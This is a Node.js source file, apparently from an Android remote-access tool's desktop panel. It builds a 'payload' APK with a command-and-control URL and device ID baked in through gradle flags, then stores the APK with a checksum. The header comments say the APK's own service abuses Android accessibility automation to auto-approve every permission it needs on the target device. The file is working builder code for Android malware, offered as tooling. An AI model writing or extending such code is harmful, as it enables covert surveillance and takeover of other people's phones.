"use strict";
/**
 * Payload builder — bakes a C2 url / device_id into the Android APK and runs
 * the gradle build, without needing adb or a manual PC setup for the device.
 *
 * Usage (from the desktop panel):
 *   const { buildApk } = require("./builder.js");
 *   buildApk({ url, device_id }, { onLog, onDone });
 *
 * The build is a plain `./gradlew assembleDebug` with
 * `-Pc2Url=... -Pc2DeviceId=...` (see app/build.gradle), then the APK is
 * copied to <projectRoot>/payloads/ with a sha256 checksum file. The APK's
 * own first-run wizard (AutoGrantService accessibility automation) then
 * requests and auto-approves every permission/activation it needs — no adb
 * and no PC-side scripts required on the device.
 */
const { spawn } = require("child_process");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");

const PROJECT_ROOT = path.resolve(__dirname, "..");
const APP_DIR = path.join(PROJECT_ROOT, "app");
const GRADLEW = process.platform === "win32"
  ? path.join(PROJECT_ROOT, "gradlew.bat")
  : path.join(PROJECT_ROOT, "gradlew");
const APK_OUT = path.join(APP_DIR, "build", "outputs", "apk", "debug", "app-debug.apk");
const PAYLOAD_DIR = path.join(PROJECT_ROOT, "payloads");

function sha256(file) {
  return crypto.createHash("sha256").update(fs.readFileSync(file)).digest("hex");
}

/** Sanitize a value so it can never break a gradle -P flag or BuildConfig.java. */
function sanitize(s, maxLen) {
  return String(s || "").replace(/[^A-Za-z0-9._:/@-]/g, "").slice(0, maxLen || 200);
}

/** Resolve a working JAVA_HOME so the desktop app never needs a manual env setup. */
function resolveJavaHome() {
  if (process.env.JAVA_HOME && fs.existsSync(path.join(process.env.JAVA_HOME, "bin", "java"))) {
    return process.env.JAVA_HOME;
  }
  const candidates = [
    "/opt/android-studio/jbr",
    "/usr/lib/jvm/java-17-openjdk-amd64",
    "/usr/lib/jvm/java-11-openjdk-amd64",
    "/usr/lib/jvm/java-21-openjdk-amd64",
    "/usr/lib/jvm/default-java",
    "/usr/local/openjdk-17",
    // Windows: Android Studio bundles a JBR in Program Files / LocalAppData.
    "C:\\Program Files\\Android\\Android Studio\\jbr",
    "C:\\Program Files\\Java\\jdk-17",
    process.env.LOCALAPPDATA ? path.join(process.env.LOCALAPPDATA, "Programs", "Android Studio", "jbr") : "",
    process.env.JAVA_HOME || "",
  ].filter(Boolean);
  for (const c of candidates) {
    if (fs.existsSync(path.join(c, "bin", "java"))) return c;
  }
  return "";
}

/** Run one build. Returns nothing; reports via onLog / onDone. */
function buildApk(config, { onLog = () => {}, onDone = () => {} } = {}) {
  let url = ((config && config.url) || "http://127.0.0.1:42474").trim();
  let deviceId = ((config && config.device_id) || "").trim();
  url = sanitize(url, 200);
  deviceId = sanitize(deviceId, 40);

  let settled = false;   // onDone fires exactly once (error + close both can fire)
  const finish = (r) => {
    if (settled) return;
    settled = true;
    onDone(r);
  };

  if (!/^https?:\/\//.test(url)) url = "http://" + url;
  if (!fs.existsSync(GRADLEW)) {
    finish({ ok: false, error: `gradlew not found at ${GRADLEW}` });
    return;
  }

  fs.mkdirSync(PAYLOAD_DIR, { recursive: true });
  const stamp = new Date().toISOString().replace(/[-:T]/g, "").slice(0, 14);
  const outName = `payload_${deviceId || "device"}_${stamp}.apk`;
  const outPath = path.join(PAYLOAD_DIR, outName);

  onLog(`[builder] building payload: url=${url} device_id=${deviceId || "(android-id)"}`);
  onLog(`[builder] gradle: ${GRADLEW} assembleDebug -Pc2Url=${url} -Pc2DeviceId=${deviceId}`);

  const args = ["assembleDebug", `-Pc2Url=${url}`, `-Pc2DeviceId=${deviceId}`, "--console=plain"];
  const env = { ...process.env, JAVA_HOME: resolveJavaHome() };
  // Windows cannot exec a .bat directly — spawn through cmd.
  const isWin = process.platform === "win32";
  const child = spawn(isWin ? "cmd" : GRADLEW,
    isWin ? ["/c", GRADLEW, ...args] : args,
    { cwd: APP_DIR, env });

  let buffer = "";
  child.stdout.on("data", (d) => {
    buffer += d.toString();
    for (const line of buffer.split("\n").slice(0, -1)) {
      const t = line.trim();
      if (t) onLog(`[builder] ${t}`);
    }
    buffer = buffer.split("\n").pop();
  });
  child.stderr.on("data", (d) => {
    const t = d.toString().trim();
    if (t) onLog(`[builder] ${t}`);
  });

  child.on("error", (err) => finish({ ok: false, error: String(err.message || err) }));

  child.on("close", (code) => {
    if (code !== 0) {
      finish({ ok: false, error: `gradle exited ${code}` });
      return;
    }
    if (!fs.existsSync(APK_OUT)) {
      finish({ ok: false, error: "build succeeded but APK not found: " + APK_OUT });
      return;
    }
    try {
      fs.copyFileSync(APK_OUT, outPath);
      const sum = sha256(outPath);
      fs.writeFileSync(outPath + ".sha256", sum + "  " + outName + "\n");
      onLog(`[builder] APK -> ${outPath} (${fs.statSync(outPath).size} bytes)`);
      onLog(`[builder] sha256 ${sum}`);
      finish({ ok: true, apk: outPath, sha256: sum, size: fs.statSync(outPath).size });
    } catch (e) {
      finish({ ok: false, error: String(e.message || e) });
    }
  });
}

module.exports = { buildApk, PAYLOAD_DIR };
